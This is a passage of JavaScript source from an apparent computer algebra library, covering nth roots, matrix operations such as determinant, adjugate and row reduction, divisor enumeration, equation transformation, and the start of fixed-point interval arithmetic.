                var N = Expression.Integer.fromNumber(n);
                return J.e(i, i + 1).divide(N.multiply(J.e(i, i)._nthRoot(n).pow(N.subtract(Expression.ONE))));
              }
              return new Expression.Symbol('aa_(' + (j - i) + ',' + j + ')');
            });
            for (var k = 2; k < J.cols(); k += 1) {
              var x = tmp.pow(n);
              tmp = tmp.map(function (e, i, j) {
                if (i + k === j) {
                  if (x.e(i, j).equals(Expression.ZERO)) {
                    return Expression.ZERO;
                  }
                  var s = new Expression.Symbol('aa_(' + (j - i) + ',' + j + ')');
                  var p = Polynomial.toPolynomial(x.e(i, j).getNumerator(), s);
                  if (p.getDegree() === 0) {
                    return x.e(i, j);
                  }
                  if (p.getDegree() !== 1) {
                    throw new TypeError("!");
                  }
                  var y = p.getCoefficient(0).negate().divide(p.getCoefficient(1));
                  return y;
                }
                return e;
              });
            }
            return tmp;
          };
          var tmp = Expression.getFormaDeJordan(x.matrix, eigenvalues, multiplicities);
          var JN = rootOfJordanForm(tmp.J, n);
          //TODO: details - ?
          return new Expression.Matrix(tmp.P.multiply(JN).multiply(tmp.P_INVERSED));
        }
      }
      //TODO: using Jordan normal form -?
    }
    //!2019-04-22
    if (x instanceof Exponentiation && x.a instanceof Integer && x.a.compareTo(Expression.ZERO) > 0) {
      //if (n === 2) {//TODO:
        if (x.b instanceof Expression.Symbol) {
          if (x.a instanceof Expression.Integer && integerPrimeFactor(x.a).equals(x.a)) {
            //return new SquareRoot(x);
            return new Expression.Exponentiation(x.a, x.b.divide(Expression.Integer.fromNumber(n)));
          }
        } else {
          return x.a.pow(x.b.divide(Expression.Integer.fromNumber(n)));
        }
      //}
    }
    
    //!2019-16-06
    if (x instanceof Exponentiation && x.a === Expression.E) {
      return x.a.pow(x.b.divide(Expression.Integer.fromNumber(n)));
    }
    //!2019-17-06
    if (x instanceof Expression.Symbol) {
      return new Expression.Exponentiation(x, Expression.ONE.divide(Expression.Integer.fromNumber(n)));
    }
    if (x instanceof Exponentiation && x.a instanceof Expression.Symbol && (n % 2 !== 0 || !x.b.getNumerator().remainder(Expression.TWO).equals(Expression.ZERO))) {
      //TODO: fix condition for n % 2 === 0
      var b = x.b.divide(Expression.Integer.fromNumber(n));
      return b.equals(Expression.ONE) ? x.a : new Expression.Exponentiation(x.a, b);
    }

    //!2019-06-20
    var v = getVariable(x);
    if (v instanceof Expression.Symbol && (n === 2 || n === 3)) {//TODO: other n's
      var p = Polynomial.toPolynomial(x, v);
      if (p.getDegree() === 1 && p.getCoefficient(0) instanceof Integer && !p.getCoefficient(0).equals(Expression.ZERO) && p.getCoefficient(1) instanceof Integer) {
        //TODO:
        var c = p.getContent();
        if (c.isNegative()) {
          c = c.negate();
        }
        if (!c.equals(Expression.ONE)) {
          return x.divide(c)._nthRoot(n).multiply(c._nthRoot(n));
        }
        if (p.getCoefficient(1).compareTo(Expression.ZERO) > 0) {
          return new Expression.Exponentiation(x, Expression.ONE.divide(Expression.Integer.fromNumber(n)));
        } else {
          //!TODO: fix
          if (n % 2 !== 0) {
            return Expression.ONE.negate()._nthRoot(n).multiply(new Expression.Exponentiation(x.negate(), Expression.ONE.divide(Expression.Integer.fromNumber(n))));
          }
        }
      }
      if (p.getDegree() > 1 && !p.getCoefficient(0).equals(Expression.ZERO)) {
        //TODO: check
        var N = Expression.Integer.fromNumber(p.getDegree());
        var t = v.multiply(p.getCoefficient(p.getDegree())._nthRoot(N)).add(p.getCoefficient(0)._nthRoot(N));
        if (x.equals(t.pow(N))) {
          //!TODO: remove
          if (p.getDegree() >= n && n % 2 !== 0) {
            return t.pow(Expression.ONE).multiply(t.pow(Expression.Integer.fromNumber(p.getDegree() - n))._nthRoot(n));
          }
          //!
          if (n % 2 !== 0) {
            return new Expression.Exponentiation(t, N.divide(Expression.Integer.fromNumber(n)));
          }
        }
      }
    }

    throw new RangeError("NotSupportedError");
  };

  function SquareRoot(a) {
    NthRoot.call(this, "sqrt", a, 2);
  }

  SquareRoot.prototype = Object.create(NthRoot.prototype);
  //!
  SquareRoot.prototype.divideInteger = function (x) {
    //TODO: check
    return x.multiply(this).divide(this.a);
  };

  Expression.prototype.squareRoot = function () {
    return this._nthRoot(2);
  };

  function CubeRoot(a) {
    NthRoot.call(this, "cbrt", a, 3);
  }

  CubeRoot.prototype = Object.create(NthRoot.prototype);

  Expression.prototype.cubeRoot = function () {
    return this._nthRoot(3);
  };

  Expression.Rank = function (matrix) {
    Expression.Function.call(this, "rank", matrix);
  };
  Expression.Rank.prototype = Object.create(Expression.Function.prototype);

  Expression.prototype.rank = function () {
    var x = this;
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    //!
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("rank", x));
    }
    return Integer.fromNumber(x.matrix.rank());
  };
  Expression.Determinant = function (matrix) {
    Expression.Function.call(this, "determinant", matrix);
  };
  Expression.Determinant.prototype = Object.create(Expression.Function.prototype);
  Expression.prototype.determinant = function () {
    var x = this;
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    //!
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event(x.matrix.getDeterminantEventType("determinant").type, x));
    }
    return x.matrix.determinant();
  };
  Expression.RowReduce = function (matrix) {
    Expression.Function.call(this, "row-reduce", matrix);
  };
  Expression.RowReduce.prototype = Object.create(Expression.Function.prototype);
  Expression.prototype.rowReduce = function () {
    var x = this;
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    //!
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("row-reduce".type, x));
    }
    //TODO: Matrix.GaussMontante
    return new Expression.Matrix(x.matrix.toRowEchelon(Matrix.GaussJordan, "", null).matrix);
  };
  Expression.Transpose = function (matrix) {
    Expression.Function.call(this, "transpose", matrix);
  };
  Expression.Transpose.prototype = Object.create(Expression.Function.prototype);
  Expression.prototype.transpose = function () {
    var x = this;
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    return new Expression.Matrix(x.matrix.transpose());
  };
  Expression.Adjugate = function (matrix) {
    Expression.Function.call(this, "adjugate", matrix);
  };
  Expression.Adjugate.prototype = Object.create(Expression.Function.prototype);
  Expression.prototype.adjugate = function () {
    var x = this;
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("adjugate", x));
    }
    if (x.matrix.rows() === 1 && x.matrix.cols() === 1) {
      return new Expression.Matrix(Matrix.I(1));
    }
    //TODO: optimize
    var C = x.matrix.map(function (element, i, j, matrix) {
      return ((i + j) - 2 * Math.floor((i + j) / 2) === 1 ? Expression.ONE.negate() : Expression.ONE).multiply(matrix.minorMatrix(i, j).determinant());
    });
    var CT = new Expression.Matrix(C.transpose());
    return CT;
    //return new Expression.Matrix(a.matrix.inverse().scale(a.matrix.determinant()));
  };

  Expression.NoAnswerExpression = function (matrix, name, second) {
    Expression.Function.call(this, name, matrix);
    this.second = second;
  };
  Expression.NoAnswerExpression.prototype = Object.create(Expression.Function.prototype);
  //TODO: remove secondArgument (?)
  Expression.prototype.transformNoAnswerExpression = function (name, second) {
    second = second == undefined ? undefined : second;
    if (!(this instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    if (name === "solve") {
      if (Expression.callback != undefined) {
        Expression.callback(new Expression.Event("solve", this));
      }
    }
    return new Expression.NoAnswerExpression(this, name, second);
  };

  //Expression.NoAnswerExpression.prototype.multiplyExpression =
  //Expression.NoAnswerExpression.prototype.multiplyMatrix =
  //Expression.NoAnswerExpression.prototype.multiplySymbol =
  //Expression.NoAnswerExpression.prototype.multiplyInteger =
  Expression.NoAnswerExpression.prototype.multiply = function () {
    throw new RangeError("NotSupportedError");
  };
  
  //TODO: remove (only for second)
  Expression.NoAnswerExpression.prototype.toString = function (options) {
    if (this.second == undefined) {
      return Expression.Function.prototype.toString.call(this, options);
    }
    return this.a.toString(setTopLevel(true, options)) + " " + this.name + " " + this.second.toString(setTopLevel(true, options));
  };


  Expression.ElementWisePower = function (a, b) {
    BinaryOperation.call(this, a, b);
  };
  Expression.ElementWisePower.prototype = Object.create(BinaryOperation.prototype);
  Expression.ElementWisePower.prototype.getS = function () {
    return ".^";
  };
  Expression.prototype.elementWisePower = function (e) {
    if (!(this instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    return new Expression.Matrix(this.matrix.map(function (element, i, j) {
      return element.pow(e);
    }));
  };

  Expression.prototype.isRightToLeftAssociative = function () {
    var x = this;
    if (x instanceof Integer) {
      return x.compareTo(Expression.ZERO) < 0;
    }
    if (x instanceof Negation) {
      return true;
    }
    if (x instanceof BinaryOperation) {
      if (x.isNegation()) {
        return true;
      }
      return x instanceof Exponentiation;
    }
    return false;
  };

  var integerPrimeFactor = function (n) {
    return new Integer(primeFactor(n.value));
  };

  //?
  var simpleDivisor = function (e) {
    if (e instanceof Division) {
      throw new RangeError();
    }
    if (e instanceof Expression.Matrix) {
      throw new RangeError();
    }
    if (e instanceof Expression.Symbol) {
      return e;
    }
    if (e instanceof Integer) {
      var x = e;
      var i = x.compareTo(Expression.ZERO) < 0 ? x.negate() : x;
      if (i.compareTo(Expression.ONE) > 0) {
        return integerPrimeFactor(i);
      }
      return null;
    }
    if (e instanceof Expression.Complex) {
      //TODO: (!)
      var f = e.primeFactor();
      if (!f.equals(e) && e.divide(f) instanceof Expression.Integer) {
        f = f.multiply(Expression.I);
      }
      return f;
      /*
      var g = integerGCD(e.real, e.imaginary);
      var t = simpleDivisor(g);
      if (t != null) {
        return t;
      }
      if (typeof hit === "function") {
        hit({everySimpleDivisor: e.toString()});
      }
      return e;
      */
    }
    var v = getVariable(e);
    if (v != undefined) {
      var r = getReplacement(e, v);
      if (!r.equals(v)) {
        return substitute(simpleDivisor(substitute(e, v, r, inverseReplacement(r, v))), v, inverseReplacement(r, v), r);
      }

      var np = Polynomial.toPolynomial(e, v);

      var content = np.getContent();
      var t = simpleDivisor(content);
      if (t != null) {
        return t;
      }

      //?
      if (np.getCoefficient(0).equals(Expression.ZERO)) {
        return v;
      }

      if (np.getDegree() >= 2) {
        var root = np.doRationalRootTest();
        if (root == null) {
          //TODO: TEST COVERAGE (!)
          var t = np._getFactorByKroneckersMethod();
          if (t != null) {
            //TODO: write a test case
            return simpleDivisor(t.calcAt(v));
          }
        }
        if (root != null) {
          var t = v.multiply(root.getDenominator()).subtract(root.getNumerator());
          return t;
        }
      }

      e = np.calcAt(v);
      if (e.isNegative()) {//TODO: remove - ?
        e = e.negate();//!?
      }
      return e;
    }
    throw new RangeError();//?
  };
  Expression.simpleDivisor = simpleDivisor;

  Expression.everyDivisor = function (e, callback) {
    if (!callback(Expression.ONE)) {
      return false;
    }
    var divisors = [];
    var rec = function (start, n, s) {
      if (n >= 0) {
        var x = divisors[n];
        for (var i = start; i <= x.e; i += 1) {
          if (!rec(0, n - 1, s.multiply(Expression.pow(x.d, i)))) {
            return false;
          }
        }
      } else {
        if (!callback(s)) {
          return false;
        }
      }
      return true;
    };
    while (!e.equals(Expression.ONE) && !e.equals(Expression.ONE.negate())) {
      var d = simpleDivisor(e);
      if (divisors.length === 0 || !divisors[divisors.length - 1].d.equals(d)) {
        divisors.push({
          d: d,
          e: 0
        });
      }
      divisors[divisors.length - 1].e += 1;
      if (!rec(divisors[divisors.length - 1].e, divisors.length - 1, Expression.ONE)) {
        return false;
      }
      e = e.divide(d);
    }
    return true;
  };

  Expression.Integer = Integer;
  Expression.NthRoot = NthRoot;
  Expression.SquareRoot = SquareRoot;
  Expression.CubeRoot = CubeRoot;
  Expression.Negation = Negation;
  Expression.Subtraction = Subtraction;
  Expression.BinaryOperation = BinaryOperation;
  Expression.Exponentiation = Exponentiation;
  Expression.Multiplication = Multiplication;
  Expression.Addition = Addition;
  Expression.Division = Division;
  //TODO: remove
  Expression.pow = function (x, count) {
    return x._pow(count);
  };
  Expression.prototype._pow = function (count) {
    return pow(this, count, Expression.ONE);
  };

  // --- 




  
  Expression.Equality = function (a, b) {
    BinaryOperation.call(this, a, b);
  };

  Expression.Equality.prototype = Object.create(BinaryOperation.prototype);
  Expression.Equality.prototype.getS = function () {
    return "=";
  };

  function AdditionIterator(e) {
    if (e == undefined) {
      throw new TypeError();
    }
    this.value = undefined;
    this.e = e;
  }
  AdditionIterator.prototype = Object.create(Iterator.prototype);
  AdditionIterator.prototype.next = function () {
    this.value = this.e instanceof Addition ? this.e.b : this.e;
    this.e = this.e instanceof Addition ? this.e.a : undefined;
    return this;
  };

  function MultiplicationIterator(e) {
    if (e == undefined) {
      throw new TypeError();
    }
    this.e = e;
  }
  MultiplicationIterator.prototype = Object.create(Iterator.prototype);
  MultiplicationIterator.prototype.next = function () {
    this.value = this.e instanceof Multiplication ? this.e.b : this.e;
    this.e = this.e instanceof Multiplication ? this.e.a : null;
    return this;
  };

  Expression.prototype.summands = function () {
    return new AdditionIterator(this);
  };

  Expression.prototype.factors = function () {
    return new MultiplicationIterator(this);
  };
  
  var splitX = function (e) {
    var scalar = undefined;
    var l = undefined;
    var r = undefined;
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      var state = 0;
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        var factor = y;
        if (!(factor instanceof Integer) && !(factor instanceof Expression.Symbol) && !(factor instanceof Expression.Matrix)) {
          throw new RangeError("NotSupportedError");
        }
        var s = factor instanceof Expression.Symbol ? factor.toString() : "";
        if (s === "X") {
          state = 1;
        } else {
          if (isScalar(factor)) {
            scalar = scalar == undefined ? factor: factor.multiply(scalar);
          } else {
            if (state === 0) {
              r = r == undefined ? factor : factor.multiply(r);
            }
            if (state === 1) {
              l = l == undefined ? factor : factor.multiply(l);
            }
          }
        }
      }
    }
    scalar = scalar == undefined ? Expression.ONE : scalar;
    return {s: scalar, l: l, r: r};
  };
  var groupX = function (a, b) {
    var tmp1 = splitX(a);
    var tmp2 = splitX(b);
    var s1 = tmp1.s;
    var l1 = tmp1.l;
    var r1 = tmp1.r;
    var s2 = tmp2.s;
    var l2 = tmp2.l;
    var r2 = tmp2.r;
    if (r1 == undefined && r2 == undefined) {
      l1 = l1 == undefined ? new IdentityMatrix("I") : l1;
      l2 = l2 == undefined ? new IdentityMatrix("I") : l2;
      return new Multiplication(s1.multiply(l1).add(s2.multiply(l2)), new Expression.Symbol("X"));
    }
    if (l1 == undefined && l2 == undefined) {
      r1 = r1 == undefined ? new IdentityMatrix("I") : r1;
      r2 = r2 == undefined ? new IdentityMatrix("I") : r2;
      return new Multiplication(new Expression.Symbol("X"), s1.multiply(r1).add(s2.multiply(r2)));
    }
    throw new RangeError("NotSupportedError");
  };

  //?
  var getExpressionWithX = function (e) {
    if (e instanceof Division) {
      if (e.getDenominator() instanceof Expression.Integer) {
        e = e.getNumerator();//!
      } else {
        throw new TypeError();
      }
    }

    var withX = undefined;
    var withoutX = undefined;
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      var summand = x;
      var hasX = false;
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        var factor = y;
        var factorBase = getBase(factor);
        if (!(factorBase instanceof Integer) && !(factorBase instanceof Expression.Symbol)) {
          if (!(factorBase instanceof Expression.Matrix)) {//?
          if (!(factorBase instanceof NthRoot)) {//?TODO: remove - ?
            throw new RangeError("NotSupportedError");
          }
          }
        }
        if (factorBase instanceof Expression.Symbol) {
          var s = factorBase.toString();
          if (s === "X") {
            if (hasX) {
              throw new RangeError("NotSupportedError");
            }
            hasX = true;
          }
        }
      }
      if (hasX) {
        if (withX != undefined) {
          withX = groupX(withX, summand);
          //throw new RangeError("NotSupportedError");
        } else {
          withX = summand;
        }
      }
      if (!hasX) {
        withoutX = withoutX == undefined ? summand.negate() : withoutX.subtract(summand);
      }
    }
    return {withX: withX, withoutX: withoutX};
  };

  var isConstant = function (e) {
    if (e instanceof Expression.Integer) {
      return true;
    } else if (e instanceof Expression.Complex) {
      return true;
    } else if (e instanceof Expression.NthRoot) {
      return isConstant(e.a);
    } else if (e instanceof Expression.Multiplication) {
      return isConstant(e.a) && isConstant(e.b);
    } else if (e instanceof Expression.Addition) {
      return isConstant(e.a) && isConstant(e.b);
    } else if (e instanceof Expression.Division) {
      return isConstant(e.a) && isConstant(e.b);
    }
    return false;
  };
  
  Expression.isConstant = isConstant;

  Expression.getMultivariatePolynomial = function (e) {
    if (e instanceof Expression.Division) {
      return undefined;
    }
    //var v = Expression.getVariable(e);
    // To avoid square roots / nth roots:
    var v = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(e))).next().value.v;
    if (v instanceof NthRoot || v instanceof Integer || v instanceof Expression.Complex) {
      v = undefined;
    }
    if (v == undefined) {
      //throw new TypeError("undefined");
      return undefined;
    }
    //?
    if (v instanceof Expression.Addition) {
      v = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(v))).next().value.v;
    }
    //?
    
    //TODO:
    var r = getReplacement(e, v);
    if (!r.equals(v)) {
      e = substitute(e, v, r, inverseReplacement(r, v));
      if (e instanceof Expression.Division && e.b instanceof Expression.Integer) {
        e = e.a;//!
      }
    }

    var p = Polynomial.toPolynomial(e, v);
    //TODO: iteration by sparse coefficients
    for (var i = 0; i <= p.getDegree(); i += 1) {
      var c = p.getCoefficient(i);
      if (!isConstant(c)) {
        var pc = Expression.getMultivariatePolynomial(c);
        if (pc == undefined) {
          return undefined;
        }
      }
    }
    return {p: p, v: inverseReplacement(r, v)};
  };
  Expression.isSingleVariablePolynomial = function (e) {
    var tmp = Expression.getMultivariatePolynomial(e);
    if (tmp == null) {
      return false;
    }
    var p = tmp.p;
    //TODO: iteration by sparse coefficients
    for (var i = 0; i <= p.getDegree(); i += 1) {
      var c = p.getCoefficient(i);
      if (!isConstant(c)) {
        return false;
      }
    }
    return true;
  };

  // TODO: NotSupportedError
  Expression.prototype.transformEquality = function (b) {
    var e = this.subtract(b);
    var tmp = getExpressionWithX(e);
    var withX = tmp.withX;
    var withoutX = tmp.withoutX;
    if (withX == undefined) {
      if (e.getDenominator() instanceof Integer && !(e.getNumerator() instanceof Expression.Matrix)) {
        //TODO: tests
        var tmp = Expression.getMultivariatePolynomial(e.getNumerator());
        if (tmp != undefined) {
          var p = tmp.p;
          var v = tmp.v;
          var m = Matrix.Zero(1, p.getDegree() + 1).map(function (e, i, j) {
            return p.getCoefficient(p.getDegree() - j);
          });
          return new Expression.NoAnswerExpression(new Expression.Matrix(m), "polynomial-roots", {variable: v});
        }
      }
      if (e instanceof Expression.Matrix && Expression.SystemOfEquations != null) {
        if (this instanceof Expression.Matrix && (b instanceof Expression.Matrix || b instanceof Expression.IdentityMatrix)) {
          return Expression.SystemOfEquations.from(this, b);
        }
        //TODO: other things - ?
      }
      throw new RangeError("NotSupportedError");
    }

    if (withoutX == undefined) {
      withoutX = Expression.ZERO;//?
    }
    //console.log(withX.toString() + "=" + withoutX.toString());

    var left = withX;
    var right = withoutX;

    var isToTheLeft = false;
    var x = withX;
    for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
      var factor = y;
      var factorBase = getBase(factor);
      //if (!(factorBase instanceof Integer) && !(factorBase instanceof Expression.Symbol)) {
      //  if (!(factorBase instanceof Expression.Matrix)) {//?
      //    throw new RangeError("NotSupportedError");
      //  }
      //}
      var isX = false;
      if (factorBase instanceof Expression.Symbol) {
        var s = factorBase.toString();
        if (s === "X") {
          isX = true;
          isToTheLeft = true;
        }
      }
      if (!isX) {
        var f = factor.inverse();
        //  console.log(isToTheLeft, f.toString());
        if (isToTheLeft) {
          right = f.multiply(right);
          //left = f.multiply(left);
        } else {
          right = right.multiply(f);
          //left = left.multiply(f);
        }
      } else {
        left = factor;
      }
    }

    //console.log(left.toString() + "=" + right.toString());

    return new Expression.Equality(left, right);
  };

  Expression.simplifications = [];
  Expression.prototype.simplifyExpression = function () {
    var e = this;
    for (var i = 0; i < Expression.simplifications.length; i += 1) {
      e = Expression.simplifications[i](e);
    }
    return e;
  };

  Expression.prototype.isExact = function () {
    return true;
  };

  Expression.getComplexConjugate = function (e) {
    return undefined;
  };

  Expression.Complex = function () {
  };

  Expression.PI = new Expression.Symbol("\u03C0"); // PI
  Expression.E = new Expression.Symbol("\u2147"); // EulerNumber
  Expression.I = new Expression.Symbol("\u2148"); // ImaginaryUnit
  
  Expression.CIRCLE = new Expression.Symbol("○");

  Expression.prototype.addPosition = function () {
    return this;
  };

  //! 2018-09-30
  Expression.SystemOfEquations = function (array) {
    this.array = array;
  };
  Expression.SystemOfEquations.from = function (s, b) {
    return new Expression.NoAnswerExpression({matrix: null}, "system-of-equations", {s: s, b: b});
  };

  Expression.ExponentiationOfMinusOne = function (x, y) {
    Expression.Exponentiation.call(this, x, y);
  };
  Expression.ExponentiationOfMinusOne.prototype = Object.create(Expression.Exponentiation.prototype);
  Expression.ExponentiationOfMinusOne.prototype.divideExpression = function (x) {
    return x.multiply(this);
  };

  Expression.ExponentiationOfImaginaryUnit = function (x, y) {
    Expression.Exponentiation.call(this, x, y);
  };
  Expression.ExponentiationOfImaginaryUnit.prototype = Object.create(Expression.Exponentiation.prototype);
  Expression.ExponentiationOfImaginaryUnit.prototype.divideExpression = function (x) {
    //return x.multiply(this);
    return x.multiply(this.multiply(this).multiply(this));
  };

  //!  
  Expression.Division.prototype.negate = function () {
    return new Expression.Division(this.a.negate(), this.b);
  };
  
  Expression.Polynomial = function (polynomial) {
    this.polynomial = polynomial;
  };
  Expression.Polynomial.prototype = Object.create(Expression.prototype);
  Expression.Polynomial.prototype.equals = function (y) {
    return y.equalsPolynomial(this);
  };
  Expression.Polynomial.prototype.equalsPolynomial = function (x) {
    //TODO: test case
    return x.polynomial.equals(this.polynomial);
  };
  Expression.prototype.equalsPolynomial = function (x) {
    return (x.polynomial.equals(Polynomial.ZERO) && this.equals(Expression.ZERO)) || (x.polynomial.getDegree() === 0 && this.equals(x.polynomial.getCoefficient(0)));
  };
  Expression.Polynomial.prototype.multiply = function (p) {
    return p.multiplyPolynomial(this);
  };
  Expression.Polynomial.prototype.multiplyPolynomial = function (x) {
    return new Expression.Polynomial(x.polynomial.multiply(this.polynomial));
  };
  Expression.Division.prototype.multiplyPolynomial = function (p) {
    return this.multiplyExpression(p);
  };
  Expression.Polynomial.prototype.divide = function (l) {
    if (l.equals(Expression.ONE)) {
      return this;
    }
    return l.dividePolynomial(this);
  };
  Expression.Division.prototype.dividePolynomial = function (p) {
    return this.divideExpression(p);
  };
  Expression.Polynomial.prototype.dividePolynomial = function (x) {
    var y = this;
    var a = x.polynomial;
    var b = y.polynomial;
    if (a.getDegree() < 0 && b.getDegree() >= 0) {
      return new Expression.Polynomial(a);
    }
    var t = undefined;
    while (b.getDegree() >= 0) {
      t = a.divideAndRemainder(b).remainder;
      a = b;
      b = t;
    }
    //TODO: 
    var gcd = a;
    if (y.polynomial.equals(gcd)) {
      return new Expression.Polynomial(x.polynomial.divideAndRemainder(gcd).quotient);
    }
    return new Expression.Division(new Expression.Polynomial(x.polynomial.divideAndRemainder(gcd).quotient), new Expression.Polynomial(y.polynomial.divideAndRemainder(gcd).quotient));
  };
  Expression.Polynomial.prototype.negate = function () {
    return new Expression.Polynomial(this.polynomial.negate());
  };
  Expression.Polynomial.prototype.add = function (y) {
    return y.addPolynomial(this);
  };
  Expression.Polynomial.prototype.addPolynomial = function (x) {
    return new Expression.Polynomial(x.polynomial.add(this.polynomial));
  };
  Expression.prototype.addPolynomial = function () {
    throw new RangeError();
  };
  Expression.Polynomial.prototype.getPrecedence = function () {
    var d = this.polynomial.getDegree();
    var count = 0;
    for (var i = 0; i <= d; i += 1) {
      if (!this.polynomial.getCoefficient(i).equals(Expression.ZERO)) {
        count += 1;
      }
    }
    return (count < 2 ? (this.polynomial.getLeadingCoefficient().equals(Expression.ONE) ? new Expression.Symbol("x") : new Expression.Multiplication(Expression.ONE, Expression.ONE)) : new Expression.Addition(Expression.ONE, Expression.ONE)).getPrecedence();
  };

  Expression.sum = function (array) {
    var count = 0;
    for (var i = 0; i < array.length; i += 1) {
      count += array[i];
    }
    return count;
  };

Expression.Multiplication.prototype.compare4Multiplication = function (y) {
  var x = this;
  if (y instanceof Addition) {//TODO: fix
    return 0 - y.compare4Multiplication(x);
  }
  var i = x.factors();
  var j = y.factors();
  var a = i.next().value;
  var b = j.next().value;
  while (a != null && b != null) {
    var c = a.compare4Multiplication(b);
    if (c !== 0) {
      return c;
    }
    a = i.next().value;
    b = j.next().value;
  }
  return a != null ? +1 : (b != null ? -1 : 0);
};

Expression.Multiplication.compare4Addition = function (x, y) {
  var i = x.factors();
  var j = y.factors();
  var a = i.next().value;
  var b = j.next().value;
  while (a != null && b != null) {
    var c = a.compare4Addition(b);
    if (c !== 0) {
      return c;
    }
    a = i.next().value;
    b = j.next().value;
  }
  return a != null ? +1 : (b != null ? -1 : 0);
};


// cos(2 * x) * cos(x)
Expression.Multiplication.prototype.compare4MultiplicationSymbol = function (x) {
  return 0 - this.compare4Multiplication(x);
};

Expression.Function.prototype.compare4Addition = function (y) {
  if (y instanceof Expression.Function) {
    return this.name < y.name ? -1 : (y.name < this.name ? +1 : this.a.compare4Addition(y.a));
  }
  return +1;
};

Expression.prototype.compare4AdditionSymbol = function (x) {
  var y = this;
  if (y instanceof Expression.Function) {
    return -1;
  }
  return Expression.prototype.compare4Addition.call(x, y);
};

Expression.Symbol.prototype.compare4Addition = function (y) {
  return y.compare4AdditionSymbol(this);
};

Expression.Function.prototype.compare4Multiplication = function (y) {
  if (y instanceof Expression.NthRoot) {
    return +1;
  }
  if (y instanceof Expression.Function) {
    return this.name < y.name ? -1 : (y.name < this.name ? +1 : this.a.compare4Multiplication(y.a));
  }
  if (y instanceof Expression.MatrixSymbol) {
    return -1;
  }
  return +1;
};

Expression.Function.prototype.compare4MultiplicationInteger = function (x) {
  return 0 - this.compare4Multiplication(x);
};

Expression.Function.prototype.compare4MultiplicationSymbol = function (x) {
  return -1;//?
};

Expression.Function.prototype.compare4MultiplicationNthRoot = function (x) {
  return 0 - this.compare4Multiplication(x);
};

Expression.Function.prototype.pow = function (y) {
  if (this instanceof Expression.NthRoot) {
    return Expression.prototype.pow.call(this, y);
  }
  if (y instanceof Expression.Integer) {
    if (y.compareTo(Expression.ONE) > 0) {
      return new Expression.Exponentiation(this, y);
    }
    return Expression.prototype.pow.call(this, y);
  }
  throw new RangeError("NotSupportedError");
};

function ExpressionWithCondition(e, n, condition) {
  this.e = e;
  this.n = n;
  this.condition = condition;
}
ExpressionWithCondition.prototype = Object.create(Expression.prototype);
ExpressionWithCondition.prototype.toString = function () {
  return this.e.toString() + '; ' + this.n.toString() + ' > ' + this.condition;
};
ExpressionWithCondition.prototype.toMathML = function (options) {
  return this.e.toMathML(options) + '<mtext>; </mtext>' + this.n.toMathML(options) + '<mo>&gt;</mo><mn>' + this.condition + '</mn>';
};

  self.Expression = Expression;

  //TODO: ?
  Addition.prototype.compare4MultiplicationNthRoot = function (x) {
    return +1;
  };

})();
(function () {
"use strict";




//TODO: ???

// https://en.wikipedia.org/wiki/Fixed-point_arithmetic
function FixedPointContext(scalingCoefficient) {
  this.scalingCoefficient = scalingCoefficient;
}
FixedPointContext.prototype.sign = function (x) { // returns -1 or +1
  return BigInteger.lessThan(x, BigInteger.BigInt(0)) ? -1 : +1;
};
FixedPointContext.prototype.round = function (x) { // returns BigInteger
  // rounding to closest, half - away from zero
  var y = this.scalingCoefficient;
  // division of x by y with rounding
  var q = BigInteger.divide(x, y);
  var r = BigInteger.subtract(x, BigInteger.multiply(q, y));
  var r2 = BigInteger.add(r, r);
  return !BigInteger.lessThan(BigInteger.unaryMinus(r2), y) ? BigInteger.subtract(q, BigInteger.BigInt(1)) : (!BigInteger.lessThan(r2, y) ? BigInteger.add(q, BigInteger.BigInt(1)) : q);
};
FixedPointContext.prototype.fromInteger = function (n) {
  return Interval.degenerate(BigInteger.multiply(n, this.scalingCoefficient));
};
FixedPointContext.prototype.compareTo = function (x, y) {
  return BigInteger.lessThan(x, y) ? -1 : (BigInteger.lessThan(y, x) ? +1 : 0);
};
FixedPointContext.prototype.negate = function (x) {
  return Interval.degenerate(BigInteger.unaryMinus(x));
};
FixedPointContext.prototype.add = function (x, y) {
  return Interval.degenerate(BigInteger.add(x, y));
};
FixedPointContext.prototype.subtract = function (x, y) {
  return BigInteger.subtract(x, y);
};
FixedPointContext.prototype._divide = function (x, y) {
  var q = BigInteger.divide(x, y);
  var r = BigInteger.subtract(x, BigInteger.multiply(q, y));
  var floor = BigInteger.lessThan(r, BigInteger.BigInt(0)) ? BigInteger.subtract(q, BigInteger.BigInt(1)) : q;
  var ceil = BigInteger.lessThan(BigInteger.BigInt(0), r) ? BigInteger.add(q, BigInteger.BigInt(1)) : q;
  return new Interval(floor, ceil);
};
FixedPointContext.prototype.multiply = function (x, y) {
  return this._divide(BigInteger.multiply(x, y), this.scalingCoefficient);
};
FixedPointContext.prototype.divide = function (x, y) {
  return this._divide(BigInteger.multiply(x, this.scalingCoefficient), y);
};
FixedPointContext.prototype.min = function (x, y) {
  return this.compareTo(x, y) > 0 ? y : x;
};
FixedPointContext.prototype.max = function (x, y) {
  return this.compareTo(x, y) < 0 ? y : x;
};


// https://en.wikipedia.org/wiki/Interval_arithmetic
function Interval(a, b) {
  this.a = a;
  this.b = b;
}
Interval.degenerate = function (a) {
  return new Interval(a, a);
};

Interval.Context = function (precision) {
  this.scalingCoefficient = BigInteger.exponentiate(BigInteger.BigInt(10), BigInteger.BigInt(precision));
  this.precision = precision;
